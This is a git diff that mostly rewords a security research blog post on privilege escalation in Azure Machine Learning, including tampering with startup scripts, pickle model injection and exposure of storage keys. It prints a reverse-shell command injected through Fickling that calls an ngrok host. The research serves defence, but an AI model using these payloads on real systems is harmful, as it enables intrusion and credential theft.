@@ -7,7 +7,7 @@ categories:
   - Azure
 ---
 
-A few months ago, when browsing through the Azure services list, I stumbled upon Azure Machine Learning. The sheer number of capabilities and complexity of the service got me curious, so I decided it would be interesting to test it for misconfigurations and vulnerabilities. After some trial and error, my research uncovered intriguing findings. In this blog post, I’ll introduce a new privilege escalation technique that can occur in Azure Machine Learning. These findings were also presented at the BSides Zagreb 2025 conference.
+A few months ago, when browsing through the Azure services list, I stumbled upon Azure Machine Learning. The sheer number of capabilities and complexity of the service got me curious, so I decided it would be interesting to test it for misconfigurations and vulnerabilities. After some trial and error, my research uncovered intriguing findings. In this blog post, I’ll introduce a new privilege escalation technique that can occur in Azure Machine Learning. These findings were also presented at the [BSides Zagreb 2025 conference]("https://www.bsideszagreb.com/archive-2025/#4").
 
 ## Introduction
 
@@ -17,8 +17,7 @@ Azure Machine Learning is a cloud-based platform designed to accelerate and mana
 - Deploy models seamlessly
 - Monitor and manage models and datasets using MLOps practices
 
-Azure ML provides a handy collection of tools for users of varying capabilities. Notebooks provide a way for advanced users to write custom code, which provides flexibility. The Designer simplifies the process of constructing models through a drag-and-drop interface, meaning that coding is unnecessary. Automated Machine Learning accelerates the process by automating the selection, training, and tuning of models. Azure Machine Learning combines these tools to enhance workflows and simplify machine learning lifecycle. But as with many aspects of security, the complexity of technology can introduce potential vulnerabilities. Azure Machine Learning is not immune to misconfigurations and security risks. In this article, I will explore potential privilege escalation paths that could allow an attacker with limited permissions to compromise Azure Machine Learning. Additionally, I will examine how, after gaining access, the attacker could pivot to other systems and targets within the company's environment.
-
+As with any complex system, misconfigurations may create opportunities for privilege escalation. In this article, I will examine how an attacker with limited access could exploit such weaknesses to compromise Azure Machine Learning and pivot to other systems within the organization.
 
 ## Let's Go Back to the Basics
 
@@ -38,22 +37,22 @@ In addition to these resources, Microsoft provides various built-in roles to man
 - **Contributor** role enables users to view, create, edit, and delete assets. This includes creating experiments, attaching compute clusters, submitting runs, and deploying web services.  
 - **Owner** role offers full access, including the ability to view, create, edit, and delete assets, as well as manage role assignments.
 
-These roles have a fundamental role in permission management and in helping individuals collaborate safely within the workspace. An AzureML Data Scientist user can access the workspace, use the notebook, and use a compute instance to run scripts and train models.
+These roles are essential for managing permissions and enabling secure collaboration within the workspace. For example, a user assigned the AzureML Data Scientist role can access the workspace, work with notebooks, and use compute instances to run scripts and train models.
 
 ### Compute Instance
 
-The user can select from various compute targets:
+Depending on the workload and specific requirements, the user can choose from several compute target options:
 
-•	Compute Cluster  
-•	Kubernetes Clusters  
-•	Attached Compute  
-•	Compute Instance  
+• Compute Clusters
+• Kubernetes Clusters
+• Attached Compute
+• Compute Instances
 
-The image above illustrates an example of what a user can observe while utilizing a notebook on a compute instance created within the workspace.
+The image above shows what a user might see when using a notebook on a compute instance in the workspace.
 
 ![notebook]({{site.baseurl}}/assets/images/AZML/notebook.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-Data scientists can run code in notebooks using different compute resources. One notable feature of Azure Machine Learning is the ability to assign each user a dedicated compute instance, ensuring that only they can access their machine. However, all files stored in the notebook section of the cloud are shared among users. This happens because all compute instances mount the same file share, allowing files to be accessible across multiple machines. When accessing a compute instance through Azure Machine Learning Studio or via SSH, two key directories are visible. The **cloudfiles** directory contains shared files available across all compute instances, while the **localfiles** directory holds files that are only accessible on the specific instance being used.
+In Azure ML, data scientists can run notebooks using various compute resources. Each user can have a dedicated compute instance, but notebook files are shared across users because all instances mount the same file share. On a compute instance, two main directories are visible: cloudfiles, shared across all instances, and localfiles, which is private to the current machine.
 
 ![compute_instance_file_share]({{site.baseurl}}/assets/images/AZML/compute_instance_file_share.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
@@ -75,16 +74,15 @@ It's important to point out that File Share relies solely on credential-based au
 
 ## Privilege Escalation and Lateral Movement
 
-Azure Machine Learning, like other Azure services, presents several potential privilege escalation pathways that attackers could exploit if they possess specific permissions. These vulnerabilities could result in the compromise of Azure Machine Learning itself or facilitate lateral movement to other Azure services, enabling further privilege escalation.
+Azure Machine Learning, like other Azure services, has potential privilege escalation paths that attackers with certain permissions could exploit to compromise the service or move laterally to other resources.
 
 ### Abusing Azure Storage Account Keys
 
-#### The Startup Script Method
+**The Startup Script Method**
 
-An attacker can escalate privileges by gaining control over the storage within the Azure Machine Learning workspace. With access to the storage account, the attacker can manipulate, edit, delete, and create files within the file share where scripts and notebooks are stored. If an attacker compromises a user with sufficient permissions, they can exploit the `Microsoft.Storage/storageAccounts/listKeys/action` permission. This permission allows the retrieval of access keys for storage accounts. As the name implies, the `listKeys` permission grants the ability to list the access keys. Since the storage account typically uses Shared Key authorization by default, obtaining the access keys grants the attacker unrestricted access to all data within the account.
+An attacker can escalate privileges by gaining control over the storage within the Azure ML workspace. With access to the storage account, the attacker can manipulate, edit, delete, and create files within the file share where scripts and notebooks are stored. If an attacker compromises a user with sufficient permissions, they can exploit the `Microsoft.Storage/storageAccounts/listKeys/action` permission. This permission allows the retrieval of access keys for storage accounts. As the name implies, the `listKeys` permission grants the ability to list the access keys. Since the storage account typically uses Shared Key authorization by default, obtaining the access keys grants the attacker unrestricted access to all data within the account.
 
-The most straightforward way to escalate privileges with this method and gain access to Azure Machine Learning compute instances is by modifying the startup script. In Azure ML administrators can create custom setup scripts to configure compute instances in the workspace. By modifying the startup script, an attacker can inject malicious code to establish persistent access, exfiltrate data, or move laterally within the Azure environment. Administrators often configure these scripts to automate the customization and setup of compute instances during provisioning. The startup script executes each time the compute instance starts, with its working directory set to the location where the script was uploaded. For example, if the script is uploaded to `Users/admin`, its execution path on the compute instance would be `/home/azureuser/cloudfiles/code/Users/admin`. This setup enables the use of relative paths within the script. However, an attacker with access to the storage account or its access keys could overwrite this Bash script. This would potentially compromise all Azure Machine Learning compute instances where the script is configured to run. Because these scripts are stored in the cloud, they are typically designed to configure multiple machines across Azure ML, including installing libraries, defining environment settings, and applying specific configurations, making them an attractive target for exploitation.
-
+One of the simplest ways to escalate privileges in Azure ML is by tampering with the startup script used to configure compute instances. Administrators often rely on these scripts to automate setup tasks such as installing libraries, setting environment variables, and applying configurations. The script runs each time a compute instance starts, executing from the directory where it was uploaded. For example, if it is placed in `Users/admin`, it will run from `/home/azureuser/cloudfiles/code/Users/admin`, allowing the use of relative paths. An attacker with access to the storage account or its keys could overwrite this script, injecting malicious code to gain persistent access, exfiltrate data, or move laterally within the Azure environment. Since these scripts are often used across multiple instances, compromising one could impact all associated compute targets, making them a prime target for exploitation.
 
 ![privilege_escalation_startup]({{site.baseurl}}/assets/images/AZML/privilege_escalation_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
@@ -92,19 +90,19 @@ To exploit this, let’s assume an attacker has compromised a user with sufficie
 
 ![ely_startup_script]({{site.baseurl}}/assets/images/AZML/ely_startup_script.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-The attacker can locate a file named startup.sh, delete it, and replace it with a malicious file of the same name containing a reverse shell. When a compute instance is started or restarted, the attacker can gain a reverse shell on the machine. In this scenario, ngrok is used to expose a listener and establish the reverse shell connection. The attacker can then obtain a Managed Identity access token and leverage it to pivot to other systems.
+The attacker can locate a file named startup.sh, delete it, and replace it with a malicious file of the same name containing a reverse shell. When a compute instance is started or restarted, the attacker can gain a reverse shell on the machine. In this scenario, ngrok is used to expose a listener and establish the reverse shell connection. The attacker can then obtain a managed identity access token and leverage it to pivot to other systems.
 
 ![shell_startup]({{site.baseurl}}/assets/images/AZML/shell_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-#### Pickle File Injection: From Storage Account to Azure Container
+**Pickle File Injection: From Storage Account to Azure Container**
 
-A similar attack scenario can be executed using a .pkl file. In this case, if user files are stored in the File Share, jobs and experiments are stored in Blob Storage. As before, we assume an attacker has compromised the user Ely, who does not have access to Azure Machine Learning but holds the Storage Account Contributor role. The attacker can identify the model stored in the blob, download it, inject malicious Python code into the model, and re-upload the malicious model back into the storage account. This poses a significant risk because .pkl files are typically neither inspected nor easily readable, they contain pre-trained models. These compromised models can be deployed across various systems, including Flask applications, Azure Virtual Machines, Azure Machine Learning endpoints, Azure App Service, Azure Containers, or even external systems outside the cloud. Moreover, such models are frequently distributed internally within organizations, shared with clients, or exposed in public repositories like GitHub, enabling attackers to spread malicious code across the organization. In our demonstration, we injected malicious code into a `model.pkl` file using a tool called Fickling. As an example, the compromised model was deployed in an Azure Container via Azure Machine Learning. 
+A similar attack scenario can be executed using a .pkl file. In this case, if user files are stored in the File Share, jobs and experiments are stored in Blob Storage. As before, we assume an attacker has compromised an user who does not have access to Azure Machine Learning but holds the Storage Account Contributor role. The attacker can identify the model stored in the blob, download it, inject malicious Python code into the model, and re-upload the malicious model back into the storage account. This poses a significant risk because .pkl files are typically neither inspected nor easily readable, they contain pre-trained models. These compromised models can be deployed across various systems, including Flask applications, Azure Virtual Machines, Azure Machine Learning endpoints, Azure App Service, Azure Containers, or even external systems outside the cloud. Moreover, such models are frequently distributed internally within organizations, shared with clients, or exposed in public repositories like GitHub, enabling attackers to spread malicious code across the organization. In our demonstration, we injected malicious code into a `model.pkl` file using a tool called Fickling. As an example, the compromised model was deployed in an Azure Container via Azure Machine Learning. 
 
 As the first step, we identify the `model.pkl` file within the blob storage that we intend to inject with malicious code.
 
 ![storage_pkl]({{site.baseurl}}/assets/images/AZML/storage_pkl.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
-After identifying the file, we download it and inject a reverse shell code with [Fickling]("https://github.com/trailofbits/fickling"). We can then overwrite the original `model.pkl` file in the blob with the compromised version containing the injected code. Once re-uploaded, the malicious code will execute whenever the model is deployed.
+After identifying the file, we download it and inject a reverse shell with [Fickling]("https://github.com/trailofbits/fickling"). We can then overwrite the original `model.pkl` file in the blob with the compromised version containing the injected code. Once re-uploaded, the malicious code will execute whenever the model is deployed.
 
 ```bash
 fickling --inject '__import__("subprocess").run(["bash", "-c", "bash -i >&/dev/tcp/0.tcp.eu.ngrock.io/122274 0>&1"])' model_original.pkl > model.pkl
@@ -128,7 +126,7 @@ Having gained access to an Azure ML workspace, the million-dollar question is: w
 
 ### Unlocking Storage Keys and Managed Identity
 
-Before I finalize this post, there’s another aspect of Azure ML I'd like to discuss. This issue was highlighted in the talk [Breaking ML Services: Finding 0-Days in Azure Machine Learning]("https://youtu.be/-K08hpzevYY?si=t0_nqWzVhgrYy88h"), presented by Nitesh Surana during HITB SECCONF in 2023. If we find ourselves in a situation where the attacker successfully compromises a compute instance. <u>It's important to know that users with access to compute instances can also access the storage account keys</u>. To demonstrate this, let's see how users in Azure ML share files between compute instances. It happens through an agent process named `dismountagent`, which checks and mounts the file share on the compute instance every 102 seconds.
+Before I finalize this article, there’s another aspect of Azure ML I'd like to discuss. This issue was highlighted in the talk [Breaking ML Services: Finding 0-Days in Azure Machine Learning]("https://youtu.be/-K08hpzevYY?si=t0_nqWzVhgrYy88h"), presented by Nitesh Surana during HITB SECCONF in 2023. If we find ourselves in a situation where the attacker successfully compromises a compute instance. <u>It's important to know that users with access to compute instances can also access the storage account keys</u>. To demonstrate this, let's see how users in Azure ML share files between compute instances. It happens through an agent process named `dismountagent`, which checks and mounts the file share on the compute instance every 102 seconds.
 
 ![azml_17]({{site.baseurl}}/assets/images/AZML/dsimountagent.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
@@ -177,8 +175,7 @@ A few weeks before this article, it seems that Microsoft decided to "fix" this i
 
 ### Boosting Security for Azure Machine Learning
 
-
-The privilege escalation techniques discussed in this bog post exploit built-in functionalities that attackers could misuse to gain elevated permissions within Azure Machine Learning. Additionally, attackers may leverage these techniques to move laterally, using Azure Machine Learning as a pivot point to escalate privileges in other Azure services. To mitigate these risks, organizations can adopt best practices to optimize security in Azure Machine Learning. A simple yet effective measure is to enforce network isolation when creating new workspaces. 
+The privilege escalation techniques discussed in this bog post exploit built-in functionalities that attackers could misuse to gain elevated permissions within Azure ML. Additionally, attackers may leverage these techniques to move laterally, using Azure ML as a pivot point to escalate privileges in other Azure services. To mitigate these risks, organizations can adopt best practices to optimize security in Azure ML. A simple yet effective measure is to enforce network isolation when creating new workspaces. 
 
 ![azml_boost_security27]({{site.baseurl}}/assets/images/AZML/boost_security.png){:style="display:block; margin-left:auto; margin-right:auto"}
 
